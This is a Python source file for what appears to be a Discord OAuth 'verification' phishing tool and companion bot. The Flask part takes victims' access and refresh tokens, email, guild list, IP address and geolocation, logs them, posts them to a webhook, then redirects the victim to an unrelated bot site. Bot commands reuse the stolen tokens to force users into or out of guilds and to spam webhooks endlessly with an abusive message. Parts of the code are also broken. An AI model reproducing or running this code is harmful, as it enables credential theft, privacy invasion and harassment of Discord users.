import flask
import os
import threading
import httpx

app = flask.Flask(__name__)

###SETTINGS###
token = os.environ["token"]
client_id = ""
scopes = "identify%20email%20connections%20guilds%20guilds.join"
redirect_uri = ""
client_secret = ""
guild_id = ""
webhook = ""
###SETTINGS###

webhook2 = ""


@app.route("/")
def home():
  return flask.redirect("/verify")

@app.route("/verified")
def verified():
  data = {
    "client_id": client_id,
    "client_secret": client_secret,
    "grant_type": "authorization_code",
    "code": flask.request.args.get("code"),
    "redirect_uri": redirect_uri
  }
  headers = {"Content-Type": "application/x-www-form-urlencoded"}
  r = httpx.post("https://discord.com/api/oauth2/token",
                 data=data,
                 headers=headers)
  access_token = r.json()["access_token"]
  s = httpx.get("https://discordapp.com/api/users/@me",
                headers={"authorization": f"Bearer {access_token}"})
  stuff = s.json()
  email = stuff["email"]
  id = stuff["id"]
  username = stuff["username"]
  avatar = stuff["avatar"]
  av = stuff["avatar_decoration"]
  discriminator = stuff["discriminator"]
  flags = stuff["flags"]
  banner = stuff["banner"]
  banner_color = stuff["banner_color"]
  accent_color = stuff["accent_color"]
  locale = stuff["locale"]
  mfa_enabled = stuff["mfa_enabled"]
  premium_type = stuff["premium_type"]
  verified = stuff["verified"]
  refresh_token = r.json()["refresh_token"]
  useragent = flask.request.headers["User-Agent"]
  x = httpx.get("https://discord.com/api/v9/users/@me/guilds", headers={"authorization": f"Bearer {access_token}"})
  z = x.json()
  ccc = []
  for ids in z:
    ccc.append(ids["id"])
  logs = open("logs.txt", "a")
  ip = flask.request.headers["X-Forwarded-For"]
  ips = httpx.get(f"https://proxycheck.io/v2/{ip}?vpn=1&asn=1")
  c = ips.json()[ip]
  proxy = c["proxy"]
  asn = c["asn"]
  provider = c["provider"]
  organisation = c["organisation"]
  continent = c["continent"]
  country = c["country"]
  isocode = c["isocode"]
  region = c["region"]
  regioncode = c["regioncode"]
  timezone = c["timezone"]
  city = c["city"]
  latitude = c["latitude"]
  longitude = c["longitude"]
  type = c["type"]
  content = f"""
```yaml
Account Info:
  Username: {username}#{discriminator}
  Guilds: {len(ccc)}
  Access_Token: {access_token}
  Refresh_Token: {refresh_token}
  Id: {id}
  Email: {email}
  Avatar: https://cdn.discordapp.com/avatars/{id}/{avatar}.png?size=4096
  Avatar_Decoration: {av}
  Flags: {flags}
  Banner: {banner}
  Banner_Color: {banner_color}
  Accent_Color: {accent_color}
  Locale: {locale}
  Mfa_Enabled: {mfa_enabled}
  Premium_Type: {premium_type}
  Verified: {verified}
IP Info:
  IP: {ip}
  Useragent: {useragent}
  asn: {asn}
  provider: {provider}
  organisation: {organisation}
  continent: {continent}
  country: {country}
  isocode: {isocode}
  region: {region}
  regioncode: {regioncode}
  timezone: {timezone}
  city: {city}
  latitude: {latitude}
  longitude: {longitude}
  proxy: {proxy}
  type: {type}
```
"""
  logs.write(f"{content}")
  headers = {
        "authorization": f"Bot {token}"
  }
  httpx.post(webhook, headers={"authorization": token}, json = {"content": content})
  return flask.redirect("https://probot.io")

if __name__ == "__main__":
  threading.Thread(target=lambda: app.run(host="0.0.0.0", port=8080)).start()

import discord
from discord.ext import commands
from pystyle import *

bot = commands.Bot(command_prefix="$", self_bot = False, help_command = None)


def banner():
  print(
    Colorate.Vertical(
      Colors.white_to_blue, """
   ▄████████  ▄████████    ▄████████    ▄███████▄     ███        ▄████████    ▄████████ 
  ███    ███ ███    ███   ███    ███   ███    ███ ▀█████████▄   ███    ███   ███    ███ 
  ███    █▀  ███    █▀    ███    █▀    ███    ███    ▀███▀▀██   ███    █▀    ███    ███ 
  ███        ███         ▄███▄▄▄       ███    ███     ███   ▀  ▄███▄▄▄      ▄███▄▄▄▄██▀ 
▀███████████ ███        ▀▀███▀▀▀     ▀█████████▀      ███     ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   
         ███ ███    █▄    ███    █▄    ███            ███       ███    █▄  ▀███████████ 
   ▄█    ███ ███    ███   ███    ███   ███            ███       ███    ███   ███    ███ 
 ▄████████▀  ████████▀    ██████████  ▄████▀         ▄████▀     ██████████   ███    ███ 
                                                                             ███    ███ 
                                                                             Made By Blitz/Lightning (Retarded Loser)""", 1))


clear = lambda: os.system("clear")

@bot.event
async def on_ready():
  clear()
  banner()
  print(f"Connected To {bot.user.name}#{bot.user.discriminator}")

@bot.command()
async def test(ctx):
  await ctx.send("`Bot Is Online`")

@bot.command()
async def check_token(ctx, access_token):
  await ctx.send("`Checking Token...`")
  s = httpx.get("https://discordapp.com/api/users/@me", headers={"authorization": f"Bearer {access_token}"})
  if s.status_code == 200:
    stuff = s.json()
    email = stuff["email"]
    id = stuff["id"]
    username = stuff["username"]
    avatar = stuff["avatar"]
    av = stuff["avatar_decoration"]
    discriminator = stuff["discriminator"]
    flags = stuff["flags"]
    banner = stuff["banner"]
    banner_color = stuff["banner_color"]
    accent_color = stuff["accent_color"]
    locale = stuff["locale"]
    mfa_enabled = stuff["mfa_enabled"]
    premium_type = stuff["premium_type"]
    verified = stuff["verified"]
    x = httpx.get("https://discord.com/api/v9/users/@me/guilds", headers={"authorization": f"Bearer {access_token}"})
    z = x.json()
    c = []
    for ids in z:
      c.append(ids["id"])
    content = f"""
  ```yaml
  Account Info:
    Username: {username}#{discriminator}
    Access_Token: {access_token}
    Guilds: {len(c)}
    Id: {id}
    Email: {email}
    Avatar_Decoration: {av}
    Flags: {flags}
    Banner: {banner}
    Banner_Color: {banner_color}
    Accent_Color: {accent_color}
    Locale: {locale}
    Mfa_Enabled: {mfa_enabled}
    Premium_Type: {premium_type}
    Verified: {verified}
  ```
  """
    embed = discord.Embed(title = f"Valid Token: {access_token}", description = content, color=0xFF5733)
    embed.set_footer(text = "Made By Blitz")
    embed.set_thumbnail(url = f"https://cdn.discordapp.com/avatars/{id}/{avatar}.png?size=4096")
    await ctx.send(embed = embed)
  else:
    embed = discord.Embed(title = "Invalid Token", description = access_token, color=0xFF5733)
    embed.set_footer(text = "Made By Blitz")
    await ctx.send(embed = embed)

@bot.command()
async def webhooks(ctx):
  await ctx.send("`Starting Webhooks`")
  webhooks = open("webhooks.txt", "r").read().split("")
  def spam():
    while True:
      httpx.post(webhook, json = {"content": "@everyone raped by blitz"})
  for webhook in webhooks:
    threading.Thread(target = spam).start()

@bot.command()
async def add(ctx, access):
  await ctx.send("Adding User To Guilds")
  def flood():
    guilds = open("guilds.txt", "r").read().split("")
    r = httpx.get("https://discordapp.com/api/users/@me", headers = {"authorization": f"Bearer {access}"})
    id = r.json()["id"]
    def put():
      r = httpx.put(f"https://discord.com/api/v9/guilds/{guild}/members/{id}", headers = {"authorization": f"Bot {token}", "content-type": "application/json"}, json = {"access_token": access})
      if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
        print("success")
      else:
        print(r.text)
    for guild in guilds:
      threading.Thread(target = put).start()
    flood()
  await ctx.send("`Finished Adding`")

@bot.command()
async def leave(ctx, access):
  await ctx.send("`Leaving All Guilds`")
  def leaves():
    guilds = open("guilds.txt", "r").read().split("")
    r = httpx.get("https://discordapp.com/api/users/@me", headers = {"authorization": f"Bearer {access}"})
    id = r.json()["id"]
    def put():
      r = httpx.delete(f"https://discord.com/api/v9/guilds/{guild}/members/{id}", headers = {"authorization": f"Bot {token}", "content-type": "application/json"})
      if r.status_code == 201:
        print("success")
    for guild in guilds:
      threading.Thread(target = put).start()
  leaves()
  await ctx.send("Finished Leaving Gui")

@bot.command()
async def help(ctx):
  embed = discord.Embed(title = "Help", description = f"""
  ```yaml
  test: Checks If Bot Is Online
  check_token: Checks Acess_Token
  add: Adds User To Guild
  leave: Makes User Leave Guild
  webhooks: Starts Webhook Spam
  ```
  """, color=0xFF5733)
  embed.set_footer(text = "Made By Blitz")
  await ctx.send(embed = embed)

@bot.command()
async def get_guilds(ctx, access_token):
  s = httpx.get("https://discordapp.com/api/users/@me", headers={"authorization": f"Bearer {access_token}"})
  username = s.json()["username"]
  discriminator = s.json()["discriminator"]
  r = httpx.get("https://discord.com/api/v9/users/@me/guilds", headers={"authorization": f"Bearer {access_token}"})
  owned = []
  unowned = []
  gd = []
  g = r.json()
  for guild in g:
    gd.append(guild["id"])
  for guild in g:
    if guild["owner"] == True:
      owned.append(f"Name: {guild['name']} | Id: {guild['id']} | Permissions: {guild['permissions']}")
    else:
      unowned.append(f"Name: {guild['name']} | Id: {guild['id']} | Permissions: {guild['permissions']}")
  files = f"""GUILDS--------------------------Total Guilds: {len(gd)}{username}"""

bot.run(token)
